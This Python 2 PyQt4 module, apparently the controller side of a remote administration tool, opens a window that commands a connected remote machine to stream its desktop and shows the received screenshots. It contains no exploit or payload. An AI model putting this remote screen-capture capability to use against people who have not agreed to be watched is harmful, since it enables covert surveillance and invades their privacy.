from PyQt4.QtGui import *
from PyQt4.QtCore import *

import threading
import socket
import Image
import zlib
import os
from ast import literal_eval

from main_ui import Ui_Form

from libs.modechat import get, send

class mainPopup(QWidget, Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        # update gui
        self.gui = QApplication.processEvents

        self.startStreaming.clicked.connect(self.start_desktop_streaming)

        self.connect(self, SIGNAL('setScreenshot()'), self.set_screenshot)

    def start_desktop_streaming(self):
        data = get(self.sock, 'startDesktop', 'startdesktop')
        print data
        if data == 'desktopStarted':
            self.desktop = DesktopStreaming(self.sock)
            self.desktop.start()
            self.set_screenshot_thread = threading.Thread(target=self.signal_screenshot)
            self.set_screenshot_thread.setDaemon(True)
            self.set_screenshot_thread.start()

    def signal_screenshot(self):
        while 1:
            self.gui()
            self.emit(SIGNAL('setScreenshot()'))

    def set_screenshot(self):
        try:
            path_to_preview = os.path.join('temp__preview.png')
            width = self.desktop.width
            height = self.desktop.height
            raw = zlib.decompress(self.desktop.screen_bits)
            size = (int(width), int(height))
            im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
            im.save(path_to_preview, 'PNG')
            pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
            self.screenshotLabel.setPixmap(pixmap)
        except:
            pass

    def closeEvent(self, event):
        pass


class DesktopStreaming(threading.Thread):
    def __init__(self, sock):
        super(DesktopStreaming, self).__init__()

        self.sock = sock
        self.active = True

        self.width = ''
        self.height = ''
        self.screen_bits = ''

    def run(self, end='[ENDOFMESSAGE]'):
        data = ''
        while self.active:
            try:
                l = self.sock.recv(1024)
                data += l
                if data.endswith(end):
                    try:
                        result = literal_eval(data[:-len(end)])
                        self.width = result['width']
                        self.height = result['height']
                        self.screen_bits = result['screenshotbits']
                    except AttributeError:
                        print 'attributeError'
                    data = ''
            except (socket.error, ValueError):
                break
        send(self.sock, 'stopDesktop')
